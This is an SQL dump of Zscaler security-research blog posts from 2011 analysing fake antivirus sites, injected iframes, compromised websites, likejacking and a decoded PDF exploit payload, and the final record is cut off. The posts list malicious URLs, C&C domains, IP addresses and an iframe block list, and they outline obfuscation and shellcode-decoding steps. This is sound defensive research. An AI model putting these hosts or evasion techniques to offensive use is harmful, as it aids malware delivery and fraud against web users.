INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (410, 'Fake AV Vs. Zscaler', 'Julien Sobrier', 'April 05, 2011', 'I\'ve been monitoring Blackhat spam SEO for more than a year now. I frequently have to modify the scripts used to retrieve the fake AV pages in order to deal with obfuscation and other obstacles the perpetrators have put in place.\r\n\r\nFake AV pages are designed to keep security scanners and researchers away. One of the techniques used to weed out automated scanning tools from victims using real web browser is JavaScript redirection. I have seen more than ten different techniques to redirect users from the spam page to malware pages leveraging different types of JavaScript. Usually, they use two to four redirections, one after the other, each using different code.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript code of some of the redirections\r\n		\r\n	\r\n\r\nOnce again, by trying too hard to hide the malicious code, Fake AV pages are actually easier to detect by looking at the redirections rather the malicious code itself.\r\n\r\nStrict HTTP Referer\r\n\r\nIn addition to making the JavaScript redirections difficult for security tools to follow, there are strict checks on the HTTP Referer header. For example, a real browser sends a Referer if the redirection is done through an HTTP Location header redirection, a meta redirection, etc., but no referer is sent through when using the JavaScript functions location.assign(new_value) or window.location=new_value. \r\n\r\nIP Blacklisting\r\n\r\nIt usually only requires a few minutes of work to bypass the \"protections\" put in place by Fake AV pages. The fake AV authors have no doubt realized that their modifications were not very effective, and that Zscaler and others are still finding their malicious content.\r\n\r\nA few days after Mike found IP tables settings shared online to block major security vendors, our main IP address was blacklisted. I quickly changed to a different IP address in the same sub-net, but only 3 days later, our complete sub-net was blacklisted. I have recently switched to Tor to get random IP address. This has allowed me to keep tracking new Fake AV pages.\r\n\r\nThe cat and mouse game between Fake AV and the security researchers will probably keep going on for a long time. Since the attackers keep modifying their content, malicious HTML, JavaScript and executables, Zscaler has to keep monitoring the changes in order to protect their customers given this rapidly-evolving threat.\r\n\r\n-- Julien', 'Analysis;Encryption;Malware', 'https://www.zscaler.com/blogs/research/fake-av-vs-zscaler');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (411, 'Worldfest, Houston Website Compromised Before The Start Of The Event', 'ThreatLabz', 'April 04, 2011', 'Today, one of our blog readers, Mr. Steve Kennedy posted a comment saying his antivirus alerted on “http://www.worldfest.com”. It appeared to be related to the Blackhole exploit kit, which I’d discussed in a previous blog post. This site turns out to be the official website for the Houston International Film Festival. The 44th annual WorldFest event will be held from April 8 to 17, 2011. Here is the screenshot of the home page:                       The malicious JavaScript code is injected at the bottom of the main page as can been seen in the attached screenshot:                  The malicious JavaScript is heavily obfuscated to evade detection. A decoded version of the JavaScript contains code that looks legitimate at first glance. A malicious iframe is then inserted in the middle of this decoded content. Here is the screenshot:                       Unfortunately, for this blog we were unable to retrieve any malicious contents because the iframed site simply redirects to Google. This may be due to the fact that the attackers have crafted the page to only deliver the payload if certain conditions have been met (i.e. correct user agent, particular geography, etc.), however, despite various approaches, we were unable to retrieve malicious content from the page. Here is the packet capture of the redirect:                       The website sets a cookie and redirects to Google. This cookie may be used by the attacker to track previous victims in order to ensure that the payload is only delivered one time. This is another common technique to keep the attack under the radar. This site was registered on 30th March 2011 in Ukraine. Here is the whois lookup,                       A Google for the query “WorldFest Houston 2011” returns this infected site as the first search result, as shown below:             Attackers often try to target popular events and the WorldFest is a valuable target with the event beginning on April 8th. This site will surely get plenty of traffic given that this is a popular film festival. We have informed the webmaster of the infection and will continue to monitor the site.         Happy Film Festival!         Umesh', 'Compromise', 'https://www.zscaler.com/blogs/research/worldfest-houston-website-compromised-start-event');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (412, 'Randomization Of Code And Binaries Used By A Fake Antivirus Website', 'ThreatLabz', 'March 23, 2011', 'Last week, I talked about heavy obfuscation being used by attackers to hide their HTML source code from detection. This time we came across an interesting fake antivirus website, which not only continually changes the source of the webpage but also the malicious binaries being used in the attack. This occurs when you revisit that same malicious site. The malicious site also changes certain strings used inside the animation sequences. For this blog, I have visited that site a few times in span of a minute and collected the various source files and malicious binaries. Here are the screenshots of fake security warnings for different visits:                       The highlighted fake security message in the above images varies each time with different trojan count. If you look at the source code of these webpages, it has been randomized for each subsequent visit. Here is a sampling of the altered source code:                           The code contains different random variables and fake security warnings, which have been split into smaller variables in an effort to evade antivirus and IDS/IPS engines that may seek to match common string patterns. As with other fake AV sites, when a victim visits the page, he is social engineered into downloading fake security software which in turns out to be malicious program. Interestingly, each time you visit this website the malicious binary changes, which results in a different MD5 hash. The size of those malicious binaries remains same. Here are the MD5 hashes for different binaries downloaded from the same website:             The Virustotal AV detection results remain very poor with only 8/43 antivirus vendors detecting the files as malicious. Here are the results for above binaries:    http://www.virustotal.com/file-scan/report.html?id=524b2ae5004d1e80628c7e69363e6a0d6357e5a01340bf0f1a9c406d9f38cd77-1300754240    http://www.virustotal.com/file-scan/report.html?id=00d2f5827712547c18e294123f7984268cc47cc2b225a9214873584178cdc058-1300754363    http://www.virustotal.com/file-scan/report.html?id=ee3c2057135d084ea8fdeba2e3f4b8c4501728ef40fcc62bec84da4cddca7352-1300754286    http://www.virustotal.com/file-scan/report.html?id=8d4ac1aeb83f18c401b0df447e5fba2a6a02a744de6f7404a76939bd4278da94-1300754302    The example demonstrates that pure pattern matching engines will fail to detect the attack based on pattern matching strings in source code. Randomization of malicious binaries will also evade good antivirus engines.    Thanks    Umesh', 'Analysis', 'https://www.zscaler.com/blogs/research/randomization-code-and-binaries-used-fake-antivirus-website');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (413, 'Many University Websites Used For Spam', 'Julien Sobrier', 'March 22, 2011', 'In January, I wrote about many high profile websites, mostly universities, that were hijacked to redirect to fake stores. Many have since been cleaned up, but a few of these University websites are still redirecting users to new fake stores (adobe-discount.com, terrific-software.com, successful-software.net, mmpsoftstore.com, successful-software.com, successful-downloads.com, general-oem.com, etc.)In the past 2 weeks, I\'ve seen a significant amount of spam hosted on University websites. Spammers seem to be using compromised user accounts on wiki-like services to upload spam for Viagra, banking loans, online casinos, etc.Fake pharmacy page hosted on the UCSF websiteThe list of Universities hosting such spam include:MIT (hxxp://nola.mit.edu/~cil/nolawiki/images/7/70/Amortizing-loan-calculator.pdf)Cornell (hxxps://confluence.cornell.edu/download/attachments/140416416/tab15.html)UCSF (hxxp://dingo.ucsf.edu/twiki/pub/People/EricAadnes/tab7.html)University of Pennsylvania (hxxp://george.isc-seo.upenn.edu/ocladmin/ocl/uploads/204599.txt)University of Massachusetts (hxxp://xserv1.umb.edu/groups/podcasts/wiki/ce448/attachments/cec02/xs57.html)Colorado State (hxxp://writing.colostate.edu/files/personal/108957/File_0FFC8EF8-EC2C-2238-F165D3DC0AA636A9.txt)Oregon State (hxxp://foodfororegon.oregonstate.edu/sites/default/files/imagecache/al65.html)OSU (hxxps://carmenwiki.osu.edu/download/attachments/16256437/tad44.html, down)WUSTL (hxxp://cssa.grad.wustl.edu/sites/cssa.grad.wustl.edu/files/imce/user1208/ed60.pdf)Eastern University (hxxp://ccgps.eastern.edu/members/dstore/member-blog.blog2/items/Cialis-Viagra-Online)University of Washington (hxxp://modular.math.washington.edu:9001/role?action=AttachFile&do=get&target=sl45)Oklahoma State (hxxp://asdevelopment.okstate.edu/logs/x.php?wy334=287)Tufts University (hxxps://wikis.uit.tufts.edu/confluence/download/attachments/29761132/ced46.html)National University of Singapore (hxxp://wiki.nus.edu/download/attachments/76947595/doc11.html)and many othersThere are thousands of these spam pages. They are used mainly in e-mail spam campaigns, hidden by a URL shortener.The university and the fraternity I attended are amongst the victims as well: hxxp://alumni.iit.edu/s/946/forms/757/100824/game31.html, hxxp://pkp.iit.edu/bog/l.php?n249=300University websites are becoming a preferred vector for different types of spam. The vast number of sub-domains, each of them likely managed by a different group which may not have professional IT/Security skills, make them an easy target.-- Julien', 'Compromise;Abuse;Phishing', 'https://www.zscaler.com/blogs/research/many-university-websites-used-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (414, 'Heavy Obfuscation Used By Fake Antivirus Websites', 'ThreatLabz', 'March 18, 2011', 'Just a few days back, I published a post discussing the popularity of fake antivirus websites in 2011. As I mentioned in the blog, attackers are continually creating new domains and websites promoting their fake software using various obfuscation techniques to hide their code from detection by IDS, IPS, antivirus etc. We have since encountered a number of malicious websites hosted on the same IP address. The main pages of the websites are heavily obfuscated. The structure of obfuscated JavaScript remains the same, throughout, but all variables are random. This likely means that the attacker has created, or is using a tool to handle the code obfuscation. Here are screenshots of the JavaScript code from two different websites:                                      Looking at the above images, you can see that the structure of code remains the same and only the variable names are randomized. Even the source of the page contains only a body tag and the malicious JavaScript. When this page loads, it starts creating animations that deliver security warnings to scare the victim. Here is one example:                                      As I mentioned in the earlier blog post, these are fake security attempting to coerce the victim into downloading fake antivirus software that will download additional malware onto the system. The code for doing these animations and initiating the download of malicious binaries is hidden inside the malicious script. Let’s decode the main script. The malicious JavaScript code has two functions defined and three lines of code to decode the content. Here is how they look:                                      The variable “euqbvulz” is passed in the first iteration to the decoding function “ikcmfynlzk()”. The decoded content is then stored in a variable called “wfuaydtmd”. The “wfuaydtmd” variable is again passed to in a second iteration to a second function called “fiyctdv()” with a “document.write()” function call. So the code will go through two iterations of the decoding. Let’s decode this code using Malzilla.                       Malzilla successfully decoded the contents. But the decoded results contain another three heavily obfuscated JavaScript snippets and some HTML code. Let’s decode them one by one. Here is first one:                       The first malicious JavaScript snippet decodes to the HTML “title” tag, which will be displayed as the title of the webpage, claiming it is a legitimate Windows security website. This means the HTML code displaying warnings and animation is hidden in the remaining malicious scripts. Here is second one:                       The above script code will load the animated images with message “Initializing virus Protection System…”. Here is the third one:                       If you look at the above image, you will notice some strings related to security, which suggests that this JavaScript code actually loads the animation. The first variable is declared as “strategy” so the strategy used by the attacker is to load the variable with JavaScript code in a CSS format. Here are some of the screenshots of that CSS code:                                                                  So, the code displaying the security warnings and messages are obfuscated multiple times by the attacker. You will notice the strings used by the attacker are displayed in warning images mentioned in the first few images. Due to the heavy obfuscation used, the detection rate remains very poor for legitimate antivirus vendors when scanning this HTML file.         Umesh', 'Evasion/Stealth', 'https://www.zscaler.com/blogs/research/heavy-obfuscation-used-fake-antivirus-websites');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (415, 'Facebook Likejacking,  Phishing And Spam', 'Julien Sobrier', 'March 14, 2011', 'Last Thursday, I wrote about Facebook Likejacking. Today, similar pages were brought to my attention. They use Likejacking to spread through user profiles using much more aggressive spam techniques.The pages looks like they come from Facebook. The teaser is a video that should be watched \"only if you are 16 or older\". The play button hides a Facebook Like widget.Spam page looking like FacebookBefore the user can play the video, he must either verify that he is at least 18, or that he is a human ... by filling out surveys, trying games, etc.! The spammers are paid for each action taken by the user (PTC campaign).\"Security check\": the user must fill out a surveyIf you stay on these pages long enough, they will attempt to send a form on your behalf. Fortunately, Firefox throws a warning.Firefox prevent the automatic POSTacidattacker.com shows a Facebook page and a Youtube page with the same content.Fake Youtube page from spammersThese spam pages can be found at:hxxp://bnltwo.info/video2/hxxp://acidattacker.com/-- Julien', 'Advertising;Data Breach', 'https://www.zscaler.com/blogs/research/facebook-likejacking-phishing-and-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (416, 'Analyzing PDF Exploits For Finding Payloads Used', 'ThreatLabz', 'March 09, 2011', 'We have written a couple of previous blogs which focus on an in-depth analysis of PDF exploits as this is yet another techniques used by attackers to package malicious code and avoid antivirus detection. We have also written in the past about different decoding filters used to hide the malicious code inside PDF files. In this blog, we will examine yet another in the wild PDF exploit which has hidden it’s malicious code under different objects. We will also identify the final payload used to carry out the attack. The malicious PDF sample was retrieved from “hxxp://sj1s.co.cc/games/pdf.php?f=21”. Here is the PDF source code:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe above PDF file is small in size and contains clear text JavaScript. Let’s look at object 1, which contains malicious JavaScript code. This code is very simple to read and understand. The JavaScript accesses some property values declared elsewhere such as “this.producer”, “this.subject” etc. Now, where are those declared values coming from? If you look at the object 3, you will notice that all other variables are accessed from these object properties. The strings used like “eval” and “StringfromCharCode”, suggest this JavaScript is used for malicious purposes. Now, we have 3 different strings from object 3, which will be used in the malicious JavaScript code.\r\n\r\n1) Property Producer contains a long array of values\r\n2) Property Subject contains string “eval”\r\n3) Property Title contains string “StringfromCharCode”\r\n\r\n\r\n\r\nWe will use Malzilla for decoding this malicious JavaScript. For that, we need to substitute the respective values into the variables. We will re-create the JavaScript code for Malzilla using those values to as it with the decoding process. We will need to look at the code carefully, because the array contains some substitution and arithmetic operations. Here is what we need to substitute:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nLet’s take the first value from the Producer property array, which is “t9.5*w”. The malicious JavaScript contains one variable “w”, declared with a value of 4 and then there is another function (axp = axp.replace\\(/t/g,\'2\'\\);), which will replace character “t” with value 2. So the first integer of the array will become (29.5*4) = 118. When we substitute the whole array with values of “t” and “w” we can create the final simple JavaScript code:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nWe will now decode the above simplified code using Malzilla. The decoded content is shown below:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe decoded content contains malicious heap spray code, shellcode and code for attacking different Adobe vulnerabilities. However, we have to yet identify what this malicious code does once it exploits the vulnerability? What payloads does it use for the exploit? For this we need to identify the shellcode used. Here is what the shellcode looks like:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe shellcode used, is in %u Unicode-encoded format. We will convert this code into byte code or executable code for further reversing using IDA pro or OllyDbg. For this, we will use favorite online tool Shellcode 2 EXE. We will copy and paste the shellcode bytes from the variable, which will generate a sample “.exe” file to analyze. Here is the screenshot:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nNow, we have executable file to analyze. So let’s open in IDA pro first to look at the strings used inside the payload. Here are the strings found,\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe string shows that this payload is going to download additional files on the system. Now let’s open this file in OllyDbg for obtaining the malicious URL used inside the payload.\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe shellcode starts with NOP instructions followed by another loop which will decode the malicious code. Look at the instructions above, inside the highlighted box. Those are the instructions which are used to decode everything. By stepping through the code, we come to know that there is an instruction that will compare the value with E9 to exit and another, which is XORing byte with a value of 31. We will put breakpoint at the RETN instruction. The code will successfully run and we will be presented with the decoded content, which contains more interesting strings.\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nLook at the highlighted string above in the dump area. This URL will be used to download another binary from the server. Now, we have identified this malicious payload and the URL used. For reference, here is the result from ThreatExpert for the same shellcode.\r\n\r\n \r\n\r\nThat’s it for now.\r\n\r\n \r\n\r\nUmesh', 'Analysis;Exploit;Malware', 'https://www.zscaler.com/blogs/research/analyzing-pdf-exploits-finding-payloads-used');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (417, 'Fake Security Software Websites – Still Popular In 2011', 'ThreatLabz', 'March 08, 2011', 'Fake security software is a form of computer malware that misleads users into installing and potentially paying for fake security software. The sites convince users to download the malicious software by displaying fake security warnings such as “Your computer is infected” etc. End users are clearly not educated about such attacks, as the campaigns remain highly successful. Below is a short blog analyzing a recent infection on a friend’s machine to illustrate the problem.         We continue to see numerous infected sites, which are redirecting users to fake security software campaigns. The pages display animated fake security warnings to users in order to scare them and convince them to download and install a binary, which is generally packaged as fake antivirus software. The victim will be infected with a downloader Trojan that will then download additional malware. Below are a few screenshots of animations typically used in the attacks:                       After this initial load animation, the user will be prompted with another security warning:                       Once a user clicks on the OK button, additional animated fake security warnings will be displayed.                       At this point, the user is prompted to download the fake antivirus software.                                 This same campaign has been used over and over again and can be found hosted at thousands of domains.                                                    All of the above animations are from the same malicious website. The content is randomly changed for each new visit to the site. Once installed the victim is forced to activate or buy a license key to remove these fake threats from the system. Here are some tips for users who still wants to stay away from those attacks.    1) No real Antivirus vendor displays such security warnings, animations and popups.    2) No website will scan a system when visited and display immediate warnings about threats on the system.    3) No real Antivirus vendor will force you to download an execuatble.    4) When you need AV software, go directly to the site of a reputable vendor yourself.    5) Keep an eye on address bar for the URL name and redirected URL names.    6) Keep any eye on the status bar of the browser, which is present at the bottom to spot redirection taking place.    7) If you want to download executable but are unsure that it is legitimate, it can be scaned against various antivirus vendiors by submitting it to a service such as VirusTotal If popular vendors triggers or declare the file as malicious, immedeatly delete it from the system.    8) Install a common antivirus solution and keep it updated with latest virus definitions.    9) Last but not least, never pay for such fake security software.    The VirusTotal results for the fake security software from the above example show that it was detected by only 21/42 popular AV vendors. Even now, we are still seeing a large number of fake security software websites promoting their fake products.         Stay safe         Umesh', 'AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/fake-security-software-websites-still-popular-2011');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (418, 'Trojan Infection Through Facebook', 'ThreatLabz', 'March 08, 2011', 'It’s no surprise to see Facebook becoming a primary focus for spreading malware. Attackers are leveraging Facebook as a means of reaching end users, delivering links in order to convince victims to click on them. The links deliver malware that allow attackers to access sensitive information or take control of a voctim machine, Recently, I found such an incident where Facebook was used to spread a known Trojan.    The victim usually gets a message containing a malicious link which looks like:             Visiting link redirects user to the following page:        The above page delivers a binary called “surprise.exe”. Virustotal  shows most common antivirus engines flag it as known Torjan Dropper. If you accidentally execute “surprise.exe”, the victim machine prompts with the following message:        Currently no malware is hosted on the site “facebook-surprise-nmsk.tk”. But its not guaranteed that it will remain in same state. Report from “ scumware.org” shows different domains used to spared this malware.All the different domains were registered with same ip. DNS lookup for the ip 89.187.53.64 can found here.        This clearly shows how attackers are taking advantage of power of social networking to spread malware. Always make sure the links are safe before clicking on them.    Pradeep', 'Malware', 'https://www.zscaler.com/blogs/research/trojan-infection-through-facebook');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (419, 'WebFusion “nosferatu” SEO/FakeAV Campaign', 'ThreatLabz', 'March 07, 2011', 'This afternoon, we received a report that a number of websites, especially those tied to WebFusion were compromised and were being leveraged in an SEO campaign to redirect victims to FakeAV malware. For example, most of the domains (~300) hosted on 81.21.75.87 (WebFusion) have been leveraged in this SEO campaign. Creative Googling for “click;nosferatu”, “/lmages/data.dat”, and other strings involved in the attack will display others.\r\n\r\n \r\n\r\nThe “nosferatu” campaign, as it’s being identified by the perpetrator, is being tracked using the tracking links:\r\nhttp://www.liveinternet.ru/click;nosferatu\r\nhttp://counter.yadro.ru/hit;nosferatu?t44.6;r\r\n\r\n\r\n\r\n\r\nAnd the affiliate Id being used in the campaign to generate revenue from the FakeAV folks is “06abQDY3” … some examples of FakeAV redirects seen include:\r\n\r\nhxxp://antivirusscannersupplies.com/?id=06abQDY3\r\nhxxp://antimoffice.com/?id=06abQDY3\r\nhxxp://clean-desktop-pc-antivir.com/?id=06abQDY3\r\nhxxp://antivirysmonde.com/?id=06abQDY3\r\nhxxp://scannermicrosoftxpantivirus.com/?id=06abQDY3\r\n\r\nGoogle results for the affiliate id, show a recent history of FakeAV abuse:\r\n\r\n\r\nDirectory Indexing was enabled on several of the hacked websites that have the SEO bot scripts, and I was able to take a look at the scripts that were dropped by the attacker for the campaign.\r\n\r\nIn this particular instance, the SEO script is lndex.php (first letter is an L). The script generates SEO spam pages from a web page template file (template.tpl) and stores the pages in the “.xcache” directory on the hacked webserver. A C&C is contacted to get the information on where to redirect potential victims, this info is written to a “data.dat” file and the contents are included at the bottom of the SEO spam pages.\r\n\r\nSnippet from SEO bot script:\r\n\r\nHere is a snippet from the SEO template page, that builds pages appearing to be WordPress 2.9 blog pages (but will redirect victims to the FakeAV page listed in the data.dat file).\r\n\r\nHere is the most recent example of the redirect information (data.dat) that I was able to pull from a live C&C:\r\n\r\nA C&C identified in this particular campaign is:\r\ndirtysexgallery.com\r\n(currently resolves to 213.174.131.136, AdvancedHosters.com)\r\n\r\nThis email address and registration information is also used to register the domain emoney-expert.com, which is an online forum for discussing making money through PTC and SEO endeavors.\r\nAs is often the case, money is the ultimate objective for these cyber criminals involved in this recent campaign.', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/webfusion-nosferatu-seofakeav-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (420, 'New Fake AV Page Uses Firefox Internals', 'Chris Mannon', 'March 02, 2011', 'Most Fake AV pages mimic a Windows Desktop application running.  In addition, the Fake AV pages have generally been the same regardless of which browser they are viewed.  I recently found a new type of Fake AV page that looks different on each browser.  And it also uses internal elements of those browsers.Internet Explorer versionThe version for Internet Explorer looks more like the previous pages I\'ve seen.Fake AV page for Internet ExplorerThe malicious executable InstallInternetDefender_722.exe is detected by only 9.5% of AV!Virustotal results for malicious executableFirefox versionThe version displayed in Firefox browsers is very interesting. It looks like the security warning Firefox shows for malicious and phishing sites.Fake AV page for FirefoxThe source code of the pages shows that the page is using internal elements of the browser to construct the page:chrome://global/skin/netError.csschrome://global/skin/icons/blacklist_favicon.pngUse of internal Firefox elementsThe warning looks very legitimate.Chrome versionLike for Firefox, the Chrome version looks like a legitimate browser warning.First warning from the fake AV pageFake AV page fro ChromeSafari versionFor Safari, only the first popup box is tailored to the browser. The main page is the same as Internet Explorer.Fake Av warning for SafariFake AV continues to evolve. This new version for Firefox will surely fool more than one user.-- Julien', 'Analysis;Phishing', 'https://www.zscaler.com/blogs/research/new-fake-av-page-uses-firefox-internals');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (421, 'BSNL, Bangalore Website Yet Another Victim Of Malicious Code Injection', 'ThreatLabz', 'March 01, 2011', 'BSNL, Bangalore telecom district has become yet another victim of poor website security and has been infected with malicious JavaScript code. This time, the code points to a malicious domain used by the popular Gumblar botnet. Recently, my colleague Pradeep blogged about two Indian websites, ICWAI and KVGBANK that were also infected with malicious content. The \"http://www.bangaloretelecom.com\" site provides information on telecommunications services offered, telephone number search, online payment of bills, etc. This is yet another example of a    popular website in India which has been compromised. Here is the screenshot of home page:                  Interestingly, the home page does not contain malicious content, but rather the malicious JavaScript has been injected into one of the “.js” files used for searching the content of the website. If you look at the above screenshot, you will see small search box. The attack will be activated if you search on anything using this functionality. Below is a screenshot of the search page a user is redirected to:                  The source code of this page contains various “.js” files. The “search.js” file is infected with malicious JavaScript code. Here is the source code of that file:                  The malicious JavaScript code is inserted at the bottom of this “.js” file. Here is the malicious content:             There are six different malicious JavaScript snippets, each obfuscated in a different way, but all ultimately point to same malicious domain. Let’s investigate one of them:                  The decoded script is shown below:                  The above malicious code points to the malicious domain “gumblar.cn”, which was used by the Gumblar Trojan. Fortunately, the malicious domain has now been taken down.         Zscaler blocks the infected page (http://bangaloretelecom.com) rather than blocking whole website. This example illustrates how malicious content can be filtered out, while still allowing access to what is an otherwise legitimate site – an important approach, given the prevalence of malicious infections. Our recent posts highlight the fact that numerous popular Indian web sites are struggling with proper application security controls.         Umesh', 'Compromise', 'https://www.zscaler.com/blogs/research/bsnl-bangalore-website-yet-another-victim-malicious-code-injection');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (422, 'Injecting Malicious HTML IFrames – Still A Popular Attack Vector', 'ThreatLabz', 'March 01, 2011', 'Injecting malicious HTML IFrames into the legitimate web pages has become a commonplace technique in web based attacks. We recently came across another website that is infected with a malicious IFrame. Further research shows that the same malicious IFrame used in this website was also used to infect a number of other legitimate websites. Here is the main page of the infected site:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe page itself provides no visible indication of infection, but if you look at the source of the webpage, you will notice a malicious IFrame injected under the Latest News section. Here is the source of page,\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThe malicious IFrame points to “hxxp:// nutcountry.ru:8080/index.php?pid=13” which is currently down. By taking the advantage of known/unknown vulnerabilities, attackers have injected malicious IFrames into many legitimate web pages. In this particular case, not only the home page is infected, but all the other pages on the site are infected. This likely indicates that the attacker used a SQL injection vulnerability to inject the malicious IFrame into the backend database from which webpages are dynamically generated. A quick search on Google reveals a significant number of websites infected with with the same IFrame. Here is screenshot of the search results:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nAnother search reveals that Google has begun to proactively warn users about some of the pages associated with this attack.\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nYou will note that the search results include ~85k sites which suggests that this particular attack was very broad in scope. This attack also appears to have leveraged persistent XSS (Cross Site Scripting) vulnerabilities to inject malicious IFrames into the comment sections of various web forums. Here is a screenshot of one such website:\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nHere is a list of malicious IFrames associated with this attack that you should block:\r\n\r\n \r\n\r\nhxxp:// nutcountry.ru:8080/index.php?pid=13\r\n\r\n \r\n\r\nhxxp:// parkperson.ru:8080/index.php?pid=13\r\n\r\n \r\n\r\nhxxp:// blockoctopus.ru:8080/index.php?pid=13\r\n\r\n \r\n\r\nhxxp:// nemohuildiin.ru/tds/go.php?sid=1\r\n\r\n \r\n\r\nhxxp://vamptoes.ru:8080/index.php?pid=13\r\n\r\n \r\n\r\nhxxp://www.bindispute.ru:8080/index.php?p13\r\n\r\n \r\n\r\nhxxp://www.bellday.ru:8080/index.php?pid=13\r\n\r\n \r\n\r\nAttackers are continuing to take advantage of the poor security in web applications by writing utilities that are capable of infecting large numbers of sites in short period of time due, which in turn translates to thousands of victims with minimal effort. \r\n\r\n \r\n\r\nUmesh', 'Analysis', 'https://www.zscaler.com/blogs/research/injecting-malicious-html-iframes-still-popular-attack-vector');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (423, 'Zscaler Safe Shopping - Stay Protected Against Compromised Or Fake Stores Online', 'Julien Sobrier', 'February 25, 2011', 'We\'re happy to release yet another free Firefox plugin to protect consumers online.\r\n\r\nIntroducing Zscaler Safe Shopping\r\n\r\nThis product has been submitted to the official Mozilla Add-ons sites, but will likely take a few weeks to be approved. In the meantime, you can download it from our site.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Zscaler Safe Shopping Add-on Installed\r\n		\r\n	\r\n\r\n\r\nWhy do you need Zscaler Safe Shopping?\r\n\r\n\r\n \r\n\r\nVirtually all browsers contain blacklists to prevent users from accessing malicious sites: Google Safe Browsing, Phishtank, etc. These blacklists do not however, generally block sites that have been compromised by Blackhat spam SEO attacks, HTML/JavaScript injections that pull malicious content from another domain. Rather, they block the malicious pages that hijacked sites redirect you to - or pull content from.\r\n\r\nWhile this is fine for most websites, assuming you simply surf and do not input any sensitive information anywhere, but would you be okay with giving your personal mailing address, phone numbers and  credit card information to a website that is fully controlled by ill-intentioned hackers? The problem is, how do you know whether the sites you are visiting have not been compromised or not when your tools ignore these types of threat?\r\n\r\nZscaler Safe Shopping is continually up-to-date, via the Zscaler cloud security service, on compromised and fake online stores. It warns users when they visit one of the suspect domains.\r\n \r\n\r\n\r\n\r\nCompromised stores\r\n\r\nA compromised store is an e-commerce website where one or several groups of hackers has full access and can add/remove/modify pages, access the database, etc. This means they can change an order form to get all shopper information, or get data directly from the store\'s database;  they can even change a payment form and redirect you to a a phishing site.\r\n\r\nZscaler detects compromised online stores based on several factors that demonstrate total control by an outside party by becoming aware of:\r\n\r\n	The presence of a backdoor that may allow anyone to control the site, as shown in the \"Hot Video\" pages: analysis of an hijacked site (Part III) blog;\r\n	Spam SEO pages;\r\n	Identified JavaScript/HTML injection;\r\n	and more.\r\n\r\nFor regular users , these sites may not show any sign of being hijacked, - and that\'s exactly what the attackers want.\r\n\r\nTo see a sample warning of a compromised store, go to http://compromised.example.com/ after you install the plugin.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Zscaler Safe Shopping Warning - Compromised store\r\n		\r\n	\r\n\r\n\r\nTo prevent people from using our list to find compromised sites for malicious purposes, we store the domains as a hash table, rather than as plain text list.\r\n\r\nFake stores\r\n\r\nRecently, we highlighted the number of high profile, legitimate sites, that have been hijacked to lead to fake online stores. These stores offer up software downloads at highly discounted prices. The downloads are not blocked as malware by Google Safe Browsing, or as phishing sites by Phishtank.\r\n\r\nWe\'ve found approximately 100 such fake stores. Those numbers are still high, with more are coming every day.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fake Online Store\r\n		\r\n	\r\n\r\n\r\nTo see the warning for a fake store, go to http://fake.example.com/ after you install the plugin.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Zscaler Safe Shopping Warning - Fake Stores\r\n		\r\n	\r\n\r\n\r\nZscaler Safe Shopping Options\r\n\r\nYou can customize Zscaler Safe Shopping via the following options:\r\n\r\n\r\n	Whitelist: do not show a warning for a list of user supplied domains\r\n	Blacklist download interval: how often should the plugin download the new list of compromised and fake stores\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Zscaler Safe Shopping Preferences\r\n		\r\n	\r\n\r\n\r\nIn addition to the option menu, Zscaler Safe Shopping adds an icon to the status bar, at the bottom of the browser. This allows you to turn the plugin on and off with a click of the mouse, without having to restart Firefox. The icon becomes gray when the plugin is disabled.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Zscaler Safe Shopping Status Bar\r\n		\r\n	\r\n\r\n \r\n\r\n 